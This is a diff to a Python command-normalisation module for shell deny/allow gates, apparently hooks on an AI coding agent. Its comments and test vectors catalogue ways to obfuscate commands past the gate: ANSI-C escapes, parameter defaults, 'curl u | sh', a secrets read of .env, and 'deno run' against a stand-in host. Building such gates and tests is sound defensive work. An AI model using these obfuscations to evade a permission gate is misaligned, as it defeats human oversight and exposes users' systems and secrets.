@@ -949,13 +949,20 @@ def anchor_regex(space: str = " +", nonspace: str = "[^ ]") -> str:
 #      Removing the `$` leaves an ORDINARY quoted run, which every tokenizer
 #      downstream already handles - so this is one rule at the root rather
 #      than a `$'` case in each of the five walks that key on a word.
-#      RESIDUE, recorded rather than modelled: the ESCAPE SEQUENCES inside a
-#      `$'...'` run (`$'\\x2f'` is a `/`) are left literal. Decoding them needs
-#      a second unescaper upstream of every tokenizer; leaving them literal is
-#      the over-match direction for a deny-list (the token stays longer and
-#      stranger, so it matches MORE patterns, never fewer). The one shape it
-#      does not reach is a protected path spelled entirely in escapes, which is
-#      recorded as residue rather than claimed closed.
+#      THE FOLD ITSELF STILL LEAVES THE ESCAPE SEQUENCES LITERAL - `$'\\x2f'`
+#      folds to `'\\x2f'`, not to `'/'` - and that is deliberate here: this
+#      step is a rewrite of the QUOTING CONSTRUCT, and leaving the body alone
+#      is the over-match direction for a deny list (the token stays longer and
+#      stranger, so it matches MORE patterns, never fewer).
+#      [X-36h] THE ONE SHAPE THAT DIRECTION DID NOT REACH - a name spelled
+#      ENTIRELY in escapes, where the longer token matches nothing and an
+#      ALLOW list therefore never sees the name at all - USED TO BE RECORDED
+#      HERE AS RESIDUE AND IS NOW MODELLED, one level up rather than inside
+#      this fold: `ansic_decode` is a SEPARATE reduction feeding a THIRD
+#      SPELLING (see "THE THIRD SPELLING" below), so the deny-list walks keep
+#      the long stranger token AND the allow-list walks also get the decoded
+#      one. Measured: `pip install $'\\x70ip'`-class payloads and the live
+#      secrets read `cat $'\\x2e\\x65nv'` were allow/allow at v2.7.1.
 #      A `$` that closes rather than opens a run (`echo 'a$'`) also loses its
 #      `$`; that is a candidate-text change in the over-match direction for
 #      every END-anchored pattern this suite carries.
@@ -1046,13 +1053,308 @@ def normalize_command(cmd: str) -> str:
 # every command that carries no continuation and no ANSI-C quote, and both
 # substrates skip an empty spelling. The gate's 60 s fail-CLOSED budget is
 # therefore unchanged except on the payloads that actually needed folding.
+# ---- [X-36h] THE THIRD SPELLING: WHAT A *DECIDABLE* EXPANSION RESOLVES TO - #
+#
+# Six spellings of `pip` reach the install anchor unresolved while bash runs
+# the installer (`$'\x70ip'`, `$'\160ip'`, `p$'\151'p`, `pi${x:-p}`,
+# `$(echo pip)`, `` `echo pip` ``). TWO attempts to close them with a DENY ARM
+# have been reverted, the second one at 62de545: keying an anchor on "a word
+# carrying `$` or a backtick is unresolvable" - even NARROWED by a trailing
+# INSTALL_VERBS word - refused 15 of 46 ORDINARY commands, because `install`,
+# `add`, `get`, `i` and `require` are the ordinary verbs of kubectl, git,
+# helm, make, brew, apt, cargo and terraform. Trailing context carries no
+# discriminating information and that direction is closed.
+#
+# THE DISCRIMINATOR IS DECIDABILITY, not adjacency: is the word's value
+# VISIBLE IN THE COMMAND TEXT?
+#
+#   DECIDABLE    `$'\x70ip'` `$'\160ip'` `p$'\151'p`   ANSI-C numeric escapes
+#                `pi${x:-p}`                           a LITERAL default branch
+#   UNDECIDABLE  `$(echo pip)`  `` `echo pip` ``       needs execution (open;
+#                                                      backlog X-36h part 2)
+#   NEITHER      `$KUBECTL` `${PIP}` `$BUILD`          -> NO NEW SPELLING AT ALL
+#
+# That third class is the whole point. A bare parameter expansion produces
+# nothing here, so the 15 over-refusals the reverted arm cost are
+# STRUCTURALLY IMPOSSIBLE rather than merely unobserved.
+#
+# The mechanism is the one the block above already sanctions - "A GATE THAT
+# CONSULTS AN ALLOW LIST JUDGES BOTH SPELLINGS AND REFUSES IF EITHER REFUSES"
+# - extended from two spellings to three. It is DENY-ONLY by construction: a
+# consumer refuses if ANY spelling refuses, so an extra spelling can only add
+# denies, never remove one. And it is the finish of the argument step 5 of
+# `normalize_command` makes for rewriting `$'` to `'` at the root: one rule
+# upstream of every tokenizer rather than a `$'` case in each of the walks.
+#
+# THE LAST ALTERNATIVE IS A CATCH-ALL, AND IT IS LOAD-BEARING. Without it the
+# regex FAILS at a non-numeric escape, and `re.sub` then retries ONE character
+# later - INSIDE the escape - so the `x70` in `\\x70` decoded and the reference
+# manufactured a spelling bash never produces (`$'\\x70ip'` is the literal word
+# `\x70ip`; bash says `command not found`). The shell walk's `'\'?*` arm
+# consumes TWO characters, which is what bash does, so the two transcriptions
+# disagreed. `ansic_char` returns `""` for a non-numeric body and the
+# `or m.group(0)` in the sub lambda re-emits it unchanged, so the catch-all
+# consumes the escape AS A UNIT and changes nothing else. `(?s:.)` rather than
+# `.` because the shell arm's `?` matches a newline too: scoping the flag
+# closes the newline question BY CONSTRUCTION rather than by measurement, and
+# a scoped group is non-capturing so `m.group(1)` still names the whole body.
+ANSIC_RE_SRC = ("\\\\(x[0-9A-Fa-f]{1,2}|u[0-9A-Fa-f]{1,4}"
+                "|U[0-9A-Fa-f]{1,8}|[0-7]{1,3}|(?s:.))")
+# Verified against bash 5.3: `$'\x70'`, `$'\160'`, `$'\u70'` and
+# `$'\U00000070'` are all `p`; `$'\x41b'` is `Ab` (TWO hex digits max) and
+# `$'\1234'` is `S4` (THREE octal digits max); `$'\xzz'` stays the four
+# literal characters. AN OCTAL ESCAPE IS A BYTE, NOT A CODE POINT: bash MASKS
+# it (`printf '\560'` emits `0o560 & 0xFF` = `0x70` = `p`, and `$'\560ip'`
+# really runs `pip`), so `ansic_char` masks too - see the note there.
+_ANSIC_RE = None                       # compiled lazily; see `_ansic_re`
+# WHAT A DECODED ESCAPE IS ALLOWED TO BECOME: printable ASCII, and NOT a
+# quote, a `$`, a backtick or a backslash. THE EXCLUSIONS ARE THE SAFETY
+# ARGUMENT - the decode can never FORGE a quoting construct, an expansion, an
+# escape or (whitespace being outside 0x21-0x7e) a SECOND WORD. So the rewrite
+# cannot manufacture a segment break, and a decoded run is exactly as many
+# words as the run the operator typed.
+ANSIC_SAFE = "".join(_c for _c in map(chr, range(0x21, 0x7f))
+                     if _c not in "'\"`$\\")
+# `${NAME:-WORD}` and its five siblings. WORD is a LITERAL the operator wrote
+# and bash may use verbatim, so it is a spelling. `${NAME}` and `$NAME` carry
+# no literal branch and produce NOTHING - that asymmetry is the fix.
+#
+# POSITIVE character class, deliberately. A NEGATED class needs a backslash,
+# and `sdk_gates_template._STATIC_BODY` is a NON-RAW string: the first cut of
+# this fix hand-wrote `[^{}$`'"\\\s]` there, the emission ate one backslash,
+# the class became `[^{}$`'"\s]` which EXCLUDES THE LETTER s, and
+# `${SUDO:-sudo} pip install evil` came out shell=deny / SDK=allow - an
+# SDK-more-permissive split introduced by the fix itself. Both regexes are now
+# rendered into the SDK prelude from HERE with `%r`, like every other cmdpos
+# regex, and neither carries a backslash at all.
+PARAM_DEFAULT_RE_SRC = ("[$][{][A-Za-z_][A-Za-z0-9_]*(?::?[-=+])"
+                        "([A-Za-z0-9._/+:@=-]*)[}]")
+_PARAM_DEFAULT_RE = None
+# HOW LONG A COMMAND MAY BE BEFORE THE THIRD SPELLING IS SKIPPED, in UTF-8
+# BYTES, rendered into both other substrates (`@@RESOLVED_MAX@@` in
+# lib/templates.py's shell transcription, `_RESOLVED_MAX` in the SDK prelude)
+# so there is ONE number, not three.
+#
+# THE UNIT IS BYTES, AND ONE NUMBER IN THREE PLACES IS NOT ENOUGH IF THE THREE
+# PLACES MEASURE DIFFERENT THINGS. The first cut of this budget compared bash
+# `${#var}` against Python `len()` and called both "characters". They are not
+# the same function: bash's `${#var}` counts CHARACTERS in a UTF-8 locale and
+# BYTES under `LC_ALL=C`, because it is the AMBIENT LOCALE, not the string,
+# that decides whether bash decodes multibyte sequences. So the same command
+# straddled the budget differently depending on the environment the hook
+# happened to run in - measured, at v2.7.1-vs-head, `$'\\x70ip' install evil`
+# padded with 8000 `中` (8,023 characters, 24,023 bytes): deny/deny under
+# `en_US.UTF-8` and shell=ALLOW / SDK=DENY under `LC_ALL=C`, a substrate split
+# manufactured by an environment variable.
+#
+# BYTES, NOT CHARACTERS, FOR THREE REASONS.
+#   1. Bytes is the only unit bash can compute in EVERY locale. `LC_ALL=C` is
+#      guaranteed to exist, so a byte count is always available; counting
+#      CHARACTERS would need a UTF-8 locale INSTALLED on the machine running
+#      the hook, and a minimal container image has none. A budget whose unit
+#      depends on the machine's locale list is this same defect relocated.
+#   2. Bytes is the unit the budget was actually MEASURED in. This is a
+#      performance guard, and every bash string operation below costs O(bytes
+#      it copies); the rungs the number is chosen from are quoted in bytes
+#      (the 4000-escape rung is 16,017 BYTES).
+#   3. Bytes >= characters for every encoding, so moving from characters to
+#      bytes can only make the spelling be SKIPPED MORE OFTEN, never less.
+#      A skipped spelling restores the v2.7.1 verdict exactly (see below), so
+#      the unit change cannot open anything v2.7.1 did not already have open,
+#      and it cannot add a deny anywhere.
+# The shell computes it in a `_blen` that sets `local LC_ALL=C` and takes
+# `${#}`; the two Python copies use `budget_len` below. Driven against each
+# other in tests/test_substrate_differential.py at +-1 BYTE and +-1 CODE
+# POINT, in four fills (ASCII, 2-, 3- and 4-byte), under `LC_ALL=C` and under
+# every UTF-8 locale the machine has - a single-locale run is exactly what
+# missed this, so the locale is a DIMENSION of that sweep and not an
+# inherited constant. The `_blen`-pins-LC_ALL-C half is asserted
+# STRUCTURALLY as well, so a machine with no UTF-8 locale cannot pass it
+# vacuously.
+#
+# WHY A DENY-ONLY REWRITE IS ALLOWED TO HAVE A CEILING. The emitted
+# settings.json gives dependency-gate and secrets-gate a 60 s PreToolUse
+# timeout, and a PreToolUse timeout FAILS CLOSED. Every bash string operation
+# in the shell transcription costs O(length of the string it names), so both
+# gates are already superlinear in the command at v2.7.1; adding a third
+# spelling adds a constant FACTOR to that curve, and a constant factor on a
+# superlinear curve moves the point where the curve crosses 60 s. WINDOWING
+# THE WALK IS NOT ENOUGH FOR THAT REASON, and the crossing was measured rather
+# than argued: `${aN:-vN}` x 11000 (175,779 bytes) runs in 49.5 s at v2.7.1 -
+# it PASSES - and in 60.5 s with the walk windowed but this guard removed,
+# which the timeout KILLS. A command that passed, turned into an unactionable
+# timeout refusal by a rewrite whose entire purpose is to add DENIES. With the
+# guard it is 49.8 s, 1.01x.
+#
+# Skipping the third spelling restores exactly the v2.7.1 verdict, because
+# `command_spellings` is monotone - every consumer refuses if ANY spelling
+# refuses, so an omitted spelling can only remove a deny, never add one. So
+# the guard cannot open anything v2.7.1 did not already have open, and it
+# makes "an oversized command is never SLOWER than v2.7.1" true BY
+# CONSTRUCTION rather than by a timing measurement that a slower machine
+# invalidates.
+#
+# WHY 16384 AND NOT MORE. The budget is set from the WORST measured shape,
+# not the average one: 4000 `\xHH` escapes in a `$'...'` run is 16,017 bytes
+# and costs 8.2 s at v2.7.1 / 14.5 s here - both a factor of four under the
+# ceiling, so the guard's own edge has four-fold headroom for a slower
+# machine. At 32 KB that same shape is 32.5 s / 57.9 s, i.e. ALREADY at the
+# ceiling, which is why the budget is not 32768.
+#
+# WHAT IT COSTS, STATED RATHER THAN ARGUED AWAY: a command longer than this
+# is not searched for an obfuscated install head, so `$'\\x70ip' install
+# evil` padded past 16 KB is allowed - as it was at v2.7.1, and as
+# `$(echo pip)` still is under X-36h part 2.
+RESOLVED_SPELLING_MAX = 16384
+
+
+def budget_len(s: str) -> int:
+    """The length `RESOLVED_SPELLING_MAX` is measured in: UTF-8 BYTES.
+
+    THE POINT OF THE FUNCTION IS THAT IT IS NOT `len`. `len` counts code
+    points, bash's `${#var}` counts whatever the ambient locale says, and the
+    budget is a claim about how much string the shell will COPY. The argument
+    for bytes is on the constant.
+
+    `surrogatepass` because a command arrives through JSON and a `\\udXXX`
+    escape decodes to a LONE SURROGATE, which plain `encode("utf-8")` raises
+    on. Raising here would turn a malformed command into a crashed hook, and a
+    PreToolUse crash fails CLOSED - an unactionable refusal for a string the
+    gate has an opinion about. A lone surrogate is 3 bytes to this function
+    and 3 bytes to bash, which is the agreement that matters.
+    """
+    return len((s or "").encode("utf-8", "surrogatepass"))
+
+
+def _ansic_re():
+    global _ANSIC_RE
+    if _ANSIC_RE is None:
+        import re as _re
+        _ANSIC_RE = _re.compile(ANSIC_RE_SRC)
+    return _ANSIC_RE
+
+
+def _param_default_re():
+    global _PARAM_DEFAULT_RE
+    if _PARAM_DEFAULT_RE is None:
+        import re as _re
+        _PARAM_DEFAULT_RE = _re.compile(PARAM_DEFAULT_RE_SRC)
+    return _PARAM_DEFAULT_RE
+
+
+def ansic_char(esc: str) -> str:
+    """One ANSI-C escape body (`x70`, `u0070`, `160`, or a NON-numeric body the
+    catch-all alternative hands back) as the character bash produces, or `""`
+    when it is not one this rewrite will emit - which covers every non-numeric
+    body, every value outside the SAFE set, and every unparseable one.
+
+    THE OCTAL BRANCH MASKS TO A BYTE. bash's `\\NNN` is a BYTE, not a code
+    point: `printf '\\560'` emits `0o560 & 0xFF` = `0x70` = `p`, so
+    `$'\\560ip' install evil` really runs `pip` (checked against bash 5.3 with
+    a fake `pip` on PATH). The shell transcription inherits that masking from
+    `printf`, so an unmasked `int(esc, 8)` here computed `chr(368)`, emitted NO
+    spelling, and left the SDK MORE PERMISSIVE than the shell on 89 of the 256
+    values in `\\400`-`\\777` - the forbidden direction, and the one the
+    three-way byte equality exists to catch.
+    """
+    try:
+        _v = (int(esc[1:], 16) if esc[:1] in ("x", "u", "U")
+              else int(esc, 8) & 0xFF)
+    except ValueError:
+        return ""
+    if _v > 0x10FFFF:
+        return ""
+    _ch = chr(_v)
+    return _ch if _ch in ANSIC_SAFE else ""
+
+
+def ansic_decode(cmd: str) -> str:
+    """Decode the NUMERIC escapes inside every `$'...'` run, IN PLACE, and
+    RE-EMIT THE RUN STILL QUOTED.
+
+    Keeping the quotes is load-bearing. Emitting the decoded body bare turns
+    `git commit -m $'pip install evil'` into THREE words and manufactures
+    exactly the over-refusal X-36k is filed for; inside a quoted run every
+    tokenizer in this suite already keeps it as one token.
+
+    An UNTERMINATED run is re-emitted unterminated - no closing quote is
+    invented - because bash will not parse that command either (`$'\\x70ip
+    install evil` is `unexpected EOF`), and inventing one would make the two
+    transcriptions disagree about a string neither substrate can act on.
+
+    RESIDUE, RECORDED SO THE NEXT READER DOES NOT REFILE IT: this walk is
+    exact against bash for the numeric families and for an ESCAPED BACKSLASH,
+    but NOT for the escapes that consume a following character. bash reads
+    `$'\\c\\x70ip'` as `0x1c` then the literal `x70ip`; all three
+    implementations here consume `\\c` as a two-character unit and then decode
+    the `\\x70`. Same for a digit-less `\\x`. All three AGREE with each other,
+    which is the contract this pair enforces, and the direction is
+    over-refusal only - spellings are ADDITIVE, so an extra one can add a
+    deny and never remove one, and no payload in this class manufactures an
+    install head or a protected path.
+    """
+    if "$'" not in cmd:
+        return cmd
+    out = []
+    i, n = 0, len(cmd)
+    while i < n:
+        if cmd[i] == "$" and i + 1 < n and cmd[i + 1] == "'":
+            j = i + 2
+            body = []
+            while j < n and cmd[j] != "'":
+                if cmd[j] == "\\" and j + 1 < n:
+                    body.append(cmd[j:j + 2])
+                    j += 2
+                    continue
+                body.append(cmd[j])
+                j += 1
+            dec = _ansic_re().sub(
+                lambda m: ansic_char(m.group(1)) or m.group(0), "".join(body))
+            closed = j < n
+            out.append("$'" + dec + ("'" if closed else ""))
+            i = j + 1 if closed else j
+            continue
+        out.append(cmd[i])
+        i += 1
+    return "".join(out)
+
+
+def param_default(cmd: str) -> str:
+    """Substitute the LITERAL branch of every `${NAME<op>WORD}`, op one of
+    `:-` `-` `:=` `=` `:+` `+`. A non-literal WORD (one carrying a space, a
+    quote, another expansion) is left alone: it is not decidable from the
+    text, and this rewrite only ever claims what the text already says."""
+    if "${" not in cmd:
+        return cmd
+    return _param_default_re().sub(lambda m: m.group(1), cmd)
+
+
+def resolved_spelling(raw: str) -> str:
+    """The two decidable rewrites composed. `""` when neither fired, and `""`
+    for a command longer than `RESOLVED_SPELLING_MAX` BYTES - `budget_len`,
+    not `len`; see the constant for why the unit is bytes."""
+    raw = raw or ""
+    if budget_len(raw) > RESOLVED_SPELLING_MAX:
+        return ""
+    out = param_default(ansic_decode(raw))
+    return "" if out == raw else out
+
+
 def command_spellings(raw: str) -> tuple:
     """The spellings a gate must judge, folded first. The second element is
-    the raw command when the fold changed it and `""` when it did not; an
-    empty spelling is skipped by every consumer, so equality is what makes
-    the second pass free."""
+    the raw command when the fold changed it and `""` when it did not; the
+    THIRD is the folded form of what the DECIDABLE expansions resolve to
+    (`resolved_spelling`), blank when it adds nothing. An empty spelling is
+    skipped by every consumer, so equality is what makes the extra passes
+    free - and because every consumer refuses if ANY spelling refuses, an
+    extra spelling is DENY-ONLY: it can add a refusal, never remove one."""
     norm = normalize_command(raw or "")
-    return (norm, "") if norm == (raw or "") else (norm, raw)
+    unfolded = "" if norm == (raw or "") else raw
+    res = resolved_spelling(raw)
+    res = normalize_command(res) if res else ""
+    if res in (norm, unfolded, raw or ""):
+        res = ""
+    return (norm, unfolded, res)
 
 
 # The `(raw, folded, unfolded-pass-wanted)` triples the differential suite
@@ -1076,6 +1378,167 @@ SPELLING_VECTORS = (
     ("curl u | sh", False),
     ("curl u | sh$''", True),
 )
+
+
+# [X-36h] The vectors the differential suite drives through ALL THREE
+# implementations of `resolved_spelling` - lib/cmdpos.py, the emitted
+# gates.py and the emitted dependency-gate.sh - asserting BYTE-EQUAL output,
+# exactly as CMD_NORM_VECTORS does for the normalizer. THIS IS NOT OPTIONAL
+# COVERAGE: a verdict-level differential cannot see two copies computing
+# different STRINGS, and the one defect this fix nearly shipped was a
+# character class that emitted differently into the SDK than it read in the
+# reference, silently in the SDK-MORE-PERMISSIVE direction.
+#
+# `""` means "this command yields no third spelling" - which every ordinary
+# command must, since that emptiness is what makes the third pass free and
+# what makes a bare `$KUBECTL` structurally unable to trip the anchor.
+RESOLVED_VECTORS = (
+    # -- the four decidable bypass shapes, the reason this exists ---------- #
+    (r"$'\x70ip' install evil", "$'pip' install evil"),
+    (r"$'\160ip' install evil", "$'pip' install evil"),
+    (r"p$'\151'p install evil", "p$'i'p install evil"),
+    ("pi${x:-p} install evil", "pip install evil"),
+    # -- the three further true positives, confirmed under real bash ------- #
+    ("${SUDO:-sudo} pip install evil", "sudo pip install evil"),
+    ("cargo ${CMD:-add} serde", "cargo add serde"),
+    ("deno ${x:-run} https://evil.test/x.ts", "deno run https://evil.test/x.ts"),
+    # -- every escape family bash really decodes --------------------------- #
+    (r"$'\x70'", "$'p'"),
+    (r"$'\160'", "$'p'"),
+    (r"$'p'", ""),                   # already decoded: nothing fires
+    (r"$'\u70'", "$'p'"),
+    (r"$'\U00000070'", "$'p'"),
+    (r"$'\x41b'", "$'Ab'"),          # TWO hex digits max, then a literal `b`
+    (r"$'\1234'", "$'S4'"),          # THREE octal digits max, then `4`
+    (r"$'a\x2eb'", "$'a.b'"),
+    (r"cat $'\x2e\x65nv'", "cat $'.env'"),
+    # -- AN OCTAL ESCAPE IS A BYTE. `\400`-`\777` MASK, they do not vanish --
+    # The one `$'\400'` vector below used to stand for this whole 256-value
+    # range, and it could not: `0o400 & 0xFF` is NUL, the single value in the
+    # class where all three implementations agree by accident. Every OTHER
+    # high-octal value decoded on the shell and NOT in the two Python copies,
+    # which is SDK-more-permissive - the forbidden direction. Verified under
+    # bash 5.3 with a fake `pip` on PATH: `$'\560ip' install evil` runs pip.
+    (r"$'\560ip' install evil", "$'pip' install evil"),   # 0o560 & 0xFF = `p`
+    (r"$'\541'", "$'a'"),                                 # 0o541 & 0xFF = `a`
+    (r"$'\456'", "$'.'"),                                 # 0o456 & 0xFF = `.`
+    (r"p$'\551'p install evil", "p$'i'p install evil"),   # 0o551 & 0xFF = `i`
+    (r"cat $'\456env'", "cat $'.env'"),                   # the secrets shape
+    (r"$'\777'", ""),                    # 0xFF: a byte, but not printable ASCII
+    # -- AN ESCAPED BACKSLASH IS CONSUMED WHOLE, so what follows stays -----
+    # literal. bash: `$'\\x70ip'` is the word `\x70ip` and reports `command
+    # not found`. The reference's `re.sub` used to restart ONE character in,
+    # inside the `\\` pair, decode the `x70` and manufacture a spelling the
+    # shell never produced - an SDK deny on a command that never runs pip.
+    (r"$'\\x70ip' install evil", ""),
+    (r"$'\\160ip' install evil", ""),
+    (r"cat $'\\x2e\\x65nv'", ""),
+    (r"$'\\x41'", ""),
+    (r"$'\\\x70'", r"$'\\p'"),       # pair consumed, the NEXT escape decodes
+    # -- what the exclusion set refuses to forge --------------------------- #
+    (r"$'a\x20b'", ""),              # 0x20: would manufacture a second word
+    (r"$'a\nb'", ""),                # not a NUMERIC escape at all
+    (r"$'\x27evil'", ""),            # 0x27 `'`  - would forge a quote
+    (r"$'\x22evil'", ""),            # 0x22 `"`
+    (r"$'\x24VAR'", ""),             # 0x24 `$`  - would forge an expansion
+    (r"$'\x60evil\x60'", ""),        # 0x60 backtick
+    (r"$'\x5cn'", ""),               # 0x5c `\`  - would forge an escape
+    (r"$'\x00'", ""),                # NUL
+    (r"$'\x7f'", ""),                # DEL, outside 0x21-0x7e
+    (r"$'\xzz'", ""),                # not a hex escape; bash keeps it literal
+    (r"$'\400'", ""),                # 0o400 MASKS to NUL (bash does not
+                                     # discard the high bits - it drops them);
+                                     # NUL is not SAFE, so this is the ONE
+                                     # value in `\400`-`\777` that yields
+                                     # nothing. It is not coverage of the rest.
+    (r"$'\x7'", ""),                 # BEL - decodable, but not SAFE
+    # -- the quotes stay on: this is the X-36k over-refusal guard ---------- #
+    (r"git commit -m $'\x70ip install evil'",
+     "git commit -m $'pip install evil'"),
+    (r"git commit -m $'fix\x3a pip install'",
+     "git commit -m $'fix: pip install'"),
+    (r"a$'\x3b'pip install evil", "a$';'pip install evil"),
+    # -- unterminated: re-emitted unterminated, no invented quote ---------- #
+    (r"$'\x70ip install evil", "$'pip install evil"),
+    # -- ${...} shapes that must NOT resolve ------------------------------- #
+    ("$KUBECTL get pods", ""),
+    ("${PIP} install requests", ""),
+    ("sudo make -C $BUILD install DESTDIR=/tmp/stage", ""),
+    ("${x:-p q} install evil", ""),          # a space is not a literal WORD
+    ("${VAR:-$(evil)} install x", ""),       # nested expansion
+    ("${VAR:-'q'} install x", ""),           # a quote in the branch
+    ("${1:-pip} install evil", ""),          # positional: not a NAME
+    ("${#x} install evil", ""),              # length, not a default
+    ("${x} ${y:-} install evil", "${x}  install evil"),  # empty branch
+    ("${x:=pip} install evil", "pip install evil"),
+    ("${x=pip} install evil", "pip install evil"),
+    ("${x:+pip} install evil", "pip install evil"),
+    ("${x+pip} install evil", "pip install evil"),
+    ("${x-pip} install evil", "pip install evil"),
+    ("${PATH:+/opt/bin} x", "/opt/bin x"),
+    ("echo ${x:-pip} install evil", "echo pip install evil"),
+    ("kubectl get ${RES:-pods}", "kubectl get pods"),
+    # -- the two composed, and the ordinary controls ----------------------- #
+    (r"${A:-pi}$'\x70' install evil", "pi$'p' install evil"),
+    ("pip install requests", ""),
+    ("npm install", ""),
+    ("echo hello", ""),
+    ("", ""),
+    ("$(echo pip) install evil", ""),        # PART 2: still open, by design
+    ("`echo pip` install evil", ""),
+)
+
+# HOW MUCH OF THE COMMAND THE SHELL TRANSCRIPTION OF `param_default` WALKS AT
+# ONCE, rendered into lib/templates.py as `@@PD_WINDOW@@`. THIS REFERENCE DOES
+# NOT USE IT - `re.sub` needs no window - and it lives here anyway for two
+# reasons: so the shell's window is not a magic number typed once into a
+# template nobody diffs, and so the vectors below, whose whole job is to LAND
+# ON that boundary, are derived from the same number rather than from a copy
+# of it that can go stale without failing anything.
+PARAM_DEFAULT_WINDOW = 1024
+
+
+def param_window_vectors() -> tuple:
+    """`(raw, param_default(raw))` pairs built to STRADDLE the shell walk's
+    window, since RESOLVED_VECTORS are all far shorter than one.
+
+    Every expected value here is written out by construction, not taken from
+    the reference, so this is a real cross-check of the windowed walk against
+    the regex and not a restatement of it. The shapes are the four cut arms
+    the shell walk chooses between - a window ending after a `}`, one ending
+    before a `${`, one holding no `${` at all, and a lone `${` at the window
+    head whose `}` is far beyond it - plus the two ways a boundary could
+    corrupt a token: splitting a `${` between its `$` and its `{`, and
+    splitting an expansion whose WORD is longer than the whole window.
+    """
+    w = PARAM_DEFAULT_WINDOW
+    v = []
+    for off in (-3, -2, -1, 0, 1, 2):
+        pad = "x" * (w + off)
+        v.append((pad + "${a:-b}", pad + "b"))
+        v.append((pad + "${a:-b}" + pad + "${c:-d}", pad + "b" + pad + "d"))
+    # a `${` split between its `$` and its `{` by the boundary
+    v.append(("$" * w + "{a:-b}", "$" * (w - 1) + "b"))
+    # a WORD, and an inner, longer than the whole window
+    v.append(("${a:-" + "v" * (3 * w) + "}", "v" * (3 * w)))
+    v.append(("${" + "n" * (3 * w) + "}", "${" + "n" * (3 * w) + "}"))
+    v.append(("${" + "n" * (3 * w), "${" + "n" * (3 * w)))
+    # brace-dense: nothing is acceptable, so the walk must return the input
+    v.append(("${" * (2 * w), "${" * (2 * w)))
+    v.append(("${" * (2 * w) + "${a:-b}", "${" * (2 * w) + "b"))
+    # dense ACCEPTED tokens, several per window
+    v.append(("${a:-b}" * (3 * w // 7), "b" * (3 * w // 7)))
+    # rejects that must stay rejects across a boundary
+    v.append(("x" * w + "${a b:-c}", "x" * w + "${a b:-c}"))
+    v.append(("x" * w + "${a:-b c}", "x" * w + "${a:-b c}"))
+    v.append(("x" * w + "${", "x" * w + "${"))
+    # the real shape, far enough in to need several windows
+    v.append((("a" * (w - 1) + " ") * 3 + "${P:-pip} install evil",
+              ("a" * (w - 1) + " ") * 3 + "pip install evil"))
+    return tuple(v)
+
+
+PARAM_WINDOW_VECTORS = param_window_vectors()
 
 
 # ---- [round-5 P1/P4] THE WORD BASH WILL EXECUTE --------------------------- #
